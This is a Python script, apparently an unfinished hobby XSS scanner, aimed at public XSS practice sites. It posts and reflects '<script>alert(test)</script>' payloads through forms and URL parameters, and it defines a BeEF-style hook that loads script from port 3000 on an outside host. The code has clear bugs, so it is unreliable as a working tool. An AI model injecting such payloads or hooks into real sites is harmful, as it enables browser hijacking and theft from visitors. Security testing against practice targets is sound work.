from cgi import test
from ipaddress import ip_address
from unicodedata import name
from urllib import response
from urllib.parse import urljoin, urlparse
import requests
import threading, time
from pyparsing import Word
from rich.console import Console
from art import *
import requests
import ftplib
import re 
from threading import Thread
from bs4 import BeautifulSoup
import socket
import sys

#from BeautifulSoup import BeautifulSoup
# Check website URL - if you can add in URL .. and you can go next to the folders.

console = Console()

class vulnerability_scanner:
    def __init__(vs):
        vs.url = "xss-quiz.int21h.jp"
        vs.resp_from_url = ""
        vs.parsed_html = ""
        vs.app = ""

        vs.script_tag = ""
        vs.form_tag = ""
        vs.input_tag = ""

        vs.extracted_script =[]
        vs.extracted_form =[]

        vs.post_data_dict ={}

        #scoring tests
        vs.vulnerability_found = 0
        vs.post_succeded = 0
        vs.xss_found = 0

        vs.session = requests.Session()
    @staticmethod
    def url_to_ip(vs):
        try:
            ip_addr = socket.gethostbyname(vs.url)
            check = socket.gethostbyaddr(ip_addr)
            print(check[0])
        except socket.gaierror as e:
            console.print(f"{e}. Exiting.", style="bold red")
            sys.exit()
        console.print(f"\nIP The IP address of the url is: [bold blue]{ip_addr}[/bold blue]")
        return ip_addr     

    def requests(vs):
        vs.resp_from_url = vs.session.get("http://" +vs.url)
        #print(vs.resp_from_url.content)
    def url_response(vs):
        vulnerability_scanner.requests(vs)
        vs.prased_html = BeautifulSoup(vs.resp_from_url.content,"html.parser")
        
        #print(script_tag)
    def mapper(vs):
        vs.script_tag = vs.prased_html.find_all("script")
        vs.form_tag = vs.prased_html.find_all("form")  
        vs.input_tag = vs.prased_html.find_all("input")
        print(vs.script_tag)

    def form_scanner(vs):
        for form in vs.form_tag:
            action=form.get("action")
            post_url = "http://"+vs.url+action
            #print(action)
            method = form.get("method")
            print(method)
            input_list = form.find_all("input")
            print("Input list:",input_list)
            for input in input_list:
                input_name = input.get("name")
                input_type = input.get("type")
                input_value = input.get("value")
                if input_type =='text':
                    input_value = 'test'
                vs.post_data_dict[input_name] = input_value
            result = vs.session.post(post_url, data = vs.post_data_dict)## here the problem
            #print(result.content)
        
        # for form in vs.form_tag:
        #     #print(form)
        #     post_url = "http://"+vs.url+action
        #     #print(post_url)
        #     response = vs.session.post(post_url, data = vs.post_data_dict)
        #     print(response.content)
    
    def xss_scanner_in_form(vs):
        ip_address =vulnerability_scanner.url_to_ip(vs)
        test_hook = "<script>alert(test)</script>"
        hook_1 = ('<script src="{}:3000/hook.js"></script>'.format(ip_address))
        for form in vs.form_tag:
            action=form.get("action")
            post_url = "http://"+vs.url+action
            #print(action)
            method = form.get("method")
            #print(method)
            input_list = form.find_all("input")
            #print(input_list)
            for input in input_list:
                input_name = input.get("name")
                input_type = input.get("type")
                input_value = input.get("value")
                print("value list",input_value)
                if input_type =='text':
                    input_value = 'test'
                vs.post_data_dict[input_name] = input_value
            result = vs.session.post(post_url, data = test_hook)## here the problem
            if test_hook in str(result.content):
                print("In Script")
        #print(hook_1)
    
    def xss_scanner_in_link(vs):
        test_hook = "<sCript>alert(test)</sCript>"
        url = "https://alf.nu/alert1?world=alert&level=alert0"
        new_url = url.replace("=","="+test_hook)
        print(new_url)
        response = vs.session.get(new_url)
        print(response.content)
        if test_hook in str(response.content):
            print("IN@@@@@@@@@@@@@")







    
        # for input in vs.form_tag:
        #      inp = input.get("action")
        #      print(inp)
        # for inp in vs.input_tag:
        #      put = inp.get("name")
        #      input_type=inp.get("type")
        #      print(input_type)
        # for form in vs.form_tag:
        #     action = form.get("action")
        #     print("vs url = ",vs.url)
        #     print("vs action = ",action)
        #     urjoin= vs.url+action
        #     #print(join)
        #     method=form.get("method")
        #     #print(method)



        # for form in vs.form_tag:
        #     act = form.get("action")
        #     print(act)

        #print(vs.form_tag)
        #print(form_tag)
    #def extract_features(vs):




scan = vulnerability_scanner() 
scan.url_response()
scan.mapper()
scan.form_scanner()
scan.xss_scanner_in_form()
#scan.xss_scanner_in_link()
#scan.extract_features()
#print(scan.url)
#scan.__init__()
#scan.parsed_html()
